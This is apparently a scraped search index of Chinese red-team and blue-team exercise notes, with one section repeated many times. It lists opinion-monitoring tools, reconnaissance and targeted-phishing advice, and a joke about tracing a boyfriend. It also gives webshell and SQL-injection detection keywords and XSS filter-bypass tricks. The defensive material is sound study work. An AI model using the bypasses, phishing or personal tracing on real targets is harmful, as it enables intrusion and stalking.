马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#微步商情"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#探索者互联网舆情监测系统免费"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#舆情录"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#脉讯互联网传播管理平台"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#瞬速互联网舆情监测系统免费"},{"categories":["hvv"],"content":"\r0x19 其它信息收集互联网上的信息和数据不断更新，每天都会产生新的信息。面对互联网上海量的信息，如何收集民意，如何收集民意信息是一个难题。 那么我们是否能借助舆情信息收集方面的技术来帮我们快速定位相关企业的威胁情报方面的重要信息呢？ 1、从媒体收集信息 国内外媒体信息来源非常广泛，尤其是网络媒体信息，传输速度快，周转环节少。此外，媒体报道的信息往往是尖锐和及时的。因此，舆论信息的收集可以从媒体开始，划分不同类型的媒体，然后针对不同类型的媒体，分类别进行收集。 2、运用舆论监督系统进行收集 因为网上的信息种类很多，收集舆论需要很多工作和一定的人力物资。因此，这项工作不能只靠人力来完成。可以使用智能网络舆论来确保网络舆论信息的客观、可靠性、正确的收集网络舆情监测系统工具来设置要监测的主题或关键词，系统将自动监测和收集与整个网络相关的信息，使相关部门和单位能够快速、直观地获取所需的数据和信息内容。 3、实时监控互联网平台信息 突发公共舆论事件通常是由于未及时发现公共舆论信息或未能收集公共舆论监测而造成的。因此，为了及时收集公众意见，我们必须首先确保能够准确掌握公众意见。为了确保快速、准确、准确和完整地收集公众意见，一些舆情监控系统工具还可以实时监控主要权威新闻媒体、主流门户网站、论坛、博客、数字报纸、行业垂直网站、新闻客户端等平台的互联网信息，从而深入准确地分析舆情发展趋势，找到解决问题的关键。 4、推荐类似微热点舆情通的软件 自己写爬虫来解决，但是这个想法精力占用较大，作为一个白嫖党，当然是现场马上能用的最香咯！自己写一个舆情监控系统？我这个编程水平还不够，就是可以，也没这么大的精力！ 那么换个方面，自己写比较麻烦！那么网上是不是有写好的舆情监控系统？（免费的！免费是重点，圈起来要考的！）好的！我们打开百度！ 金石舆情监测系统舆情监测范围包含各大新闻门户网站、论坛、贴吧、博客、微博、文档、视频等。您还可以自定义网站采集监测。系统具有类同信息分析、追踪信息源头、制作舆情专题报告的功能。系统能自动预警，自动生成舆情报告 。 马克斯舆情监测(免费版)马克斯舆情监测免费版，所有用户每天可以使用系统一次，每日24点刷新。中级版用户的查询次数为10次/天，价格为199元/月高级版不仅将用户每日查询次升级为100次/天,价格为1999元/月 项目地址：http://www.gg360.cn/ 中科微步项目地址：http://www.vbu.cn/ 微步商情这个注册最难注册，试了好多接码平台，也可以白嫖免费版的 项目地址：http://e.vbu.cn/#/ 探索者互联网舆情监测系统(免费)搭建在自身系统上面的舆情监控系统 http://www.ourgogo.net/articles.aspx?id=70 舆情录免费使用，但有限制，即使关键字组合只能是1个 项目地址：http://www.yuqinglu.com/index.html 脉讯互联网传播管理平台免费版有限制，可以白嫖就对了 项目地址：http://platform.maixunbytes.com/ 瞬速互联网舆情监测系统(免费)一款功能强大、简单实用的互联网情报采集、监控、跟踪与分析的软件。可以时刻监测互联网上最新的新闻、博客、论坛等与您相关的资讯信息。软件提供多种舆情监测功能，网站跟踪、论坛跟贴、全网监测、可以无遗漏地满足了目前互联网信息监测所必需的作业模式。 PS：试用期一个月 瞬速网络信息采集系统(免费)瞬速网络信息采集系统是一套互联网信息采集软件。软件基于人工智能的自动学习技术，只要输入目标网站的网址就可以自动监测并采集目标网站上最新的资讯信息，自动过滤掉无关的信息（如广告信息、版权信息等）达到了所采即所得的效果。同时，自动识别与资讯信息相关的图片、附件等感兴趣的媒体资源，并可根据设置自动采集到本地或是建立映射快照。除了满足新闻信息的智能采集外，软件可以根据业务需求在软件上自定义配置相应的业务规则，软件可以满足大数据、多分类、跨网站下的多维度的数据采集（如房产信息、求职招聘、汽车数据等）与数据分类管理等。 PS：试用期7天 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:19","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#瞬速网络信息采集系统免费"},{"categories":["hvv"],"content":"\r0x20 搜索引擎收集的所有资产如上标题里说的资产，不是普通定义中的资产，而是信息收集里面的企业信息资产。 ICMP存活探测–\u003e端口开放探测–\u003e端口指纹服务识别–\u003e提取快照(若为WEB)–\u003e搜索网页敏感内容(邮箱、手机号、URL)–\u003e生成结果报表 此处为什么会这么讲呢？ 因为，随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着“隐形资产”，这些“隐形资产”通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。 在渗透测试中，我们需要尽可能多的去收集目标的信息，资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信 息，这对我们进一步的渗透测试显得尤为重要。 APP、媒体公众号等收集 通过百家号、微博、抖音、快手、哔哩哔哩等媒体公众号，可以收集到员工的账号。或是不小心泄露出来的一些web服务。当收集到qq群这种信息时还可以”潜伏”到qq群，qq群文件可能会包含一些敏感的信息。这方面的信息收集能够帮助我们在漏洞利用时构造一些参数值或是进行暴力破解等等。 随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。 通过对APP流量的抓取也可以获取到部分子域名或者ip。 http://www.zyzilxy.top:1220/?p=5328 行业系统 同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比 通用：办公OA、邮件系统、VPN等 医院：门户、预约系统、掌上医院、微信公众平台等 而关于信息收集，主要就是在资产收集之后，针对单个站点的信息进行收集，主要围绕服务器ip，域名，网站等. 对于更高阶的安全从业人员来说，可以结合威胁情报，对红队人员进行针对性溯源。 对于企业的运维人员来说，可以结合流量日志，对IP信誉进行碰撞，发现隐藏的攻击IP。 对于红队人员来说，可以结合威胁情报搜索攻击资产，从而不必使用目录爆破方式进行批量的爆破，费时费力（有的子目录的名字不好猜，通过爆破目录工具也拿不到）。 有时主站实在弄不动，其实也可以去收集情报，意思就是说：收集主站官网上发布的相关情报信息进行汇总，说不定会有额外的发现。 **例如：**某Ax集团从2017年开始改名为某AX1集团。但我们分配下来的目标时拿到的目标单位名称是某AX1集团，那么我们猜测，去信息收集相关的某Ax集团资产信息（有些忘记改网站名称，甚至有可能一直使用之前该名称之前的单位名称），我们也可以拿到足够多的情报后，制作针对性的钓鱼邮件，网上收集相关的目标单位的在职人员的邮箱，进行钓鱼 对于女生来说，可以使用情报对男朋友进行溯源。 参考链接：https://mp.weixin.qq.com/s/VJCPAluqz8YDyCxE8HZtdQ https://mp.weixin.qq.com/s/SwnFnn9kB-_3fSLvFS5bVQ https://mp.weixin.qq.com/s/hZ47n0SgycWxf2lWoRp1ZQ https://mp.weixin.qq.com/s/4SIxsPoIICxHxZYs64I5vw https://mp.weixin.qq.com/s/QDarNtl9yPjGl8u2QQ2QRA ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:20","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x20-搜索引擎收集的所有资产"},{"categories":["hvv"],"content":"\r0x20 搜索引擎收集的所有资产如上标题里说的资产，不是普通定义中的资产，而是信息收集里面的企业信息资产。 ICMP存活探测–\u003e端口开放探测–\u003e端口指纹服务识别–\u003e提取快照(若为WEB)–\u003e搜索网页敏感内容(邮箱、手机号、URL)–\u003e生成结果报表 此处为什么会这么讲呢？ 因为，随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着“隐形资产”，这些“隐形资产”通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。 在渗透测试中，我们需要尽可能多的去收集目标的信息，资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信 息，这对我们进一步的渗透测试显得尤为重要。 APP、媒体公众号等收集 通过百家号、微博、抖音、快手、哔哩哔哩等媒体公众号，可以收集到员工的账号。或是不小心泄露出来的一些web服务。当收集到qq群这种信息时还可以”潜伏”到qq群，qq群文件可能会包含一些敏感的信息。这方面的信息收集能够帮助我们在漏洞利用时构造一些参数值或是进行暴力破解等等。 随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。 通过对APP流量的抓取也可以获取到部分子域名或者ip。 http://www.zyzilxy.top:1220/?p=5328 行业系统 同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比 通用：办公OA、邮件系统、VPN等 医院：门户、预约系统、掌上医院、微信公众平台等 而关于信息收集，主要就是在资产收集之后，针对单个站点的信息进行收集，主要围绕服务器ip，域名，网站等. 对于更高阶的安全从业人员来说，可以结合威胁情报，对红队人员进行针对性溯源。 对于企业的运维人员来说，可以结合流量日志，对IP信誉进行碰撞，发现隐藏的攻击IP。 对于红队人员来说，可以结合威胁情报搜索攻击资产，从而不必使用目录爆破方式进行批量的爆破，费时费力（有的子目录的名字不好猜，通过爆破目录工具也拿不到）。 有时主站实在弄不动，其实也可以去收集情报，意思就是说：收集主站官网上发布的相关情报信息进行汇总，说不定会有额外的发现。 **例如：**某Ax集团从2017年开始改名为某AX1集团。但我们分配下来的目标时拿到的目标单位名称是某AX1集团，那么我们猜测，去信息收集相关的某Ax集团资产信息（有些忘记改网站名称，甚至有可能一直使用之前该名称之前的单位名称），我们也可以拿到足够多的情报后，制作针对性的钓鱼邮件，网上收集相关的目标单位的在职人员的邮箱，进行钓鱼 对于女生来说，可以使用情报对男朋友进行溯源。 参考链接：https://mp.weixin.qq.com/s/VJCPAluqz8YDyCxE8HZtdQ https://mp.weixin.qq.com/s/SwnFnn9kB-_3fSLvFS5bVQ https://mp.weixin.qq.com/s/hZ47n0SgycWxf2lWoRp1ZQ https://mp.weixin.qq.com/s/4SIxsPoIICxHxZYs64I5vw https://mp.weixin.qq.com/s/QDarNtl9yPjGl8u2QQ2QRA ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:20","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#参考链接"},{"categories":["hvv"],"content":"HVV专题–蓝队溯源反制 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:0:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；\u003cimg/src=1\u003e；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 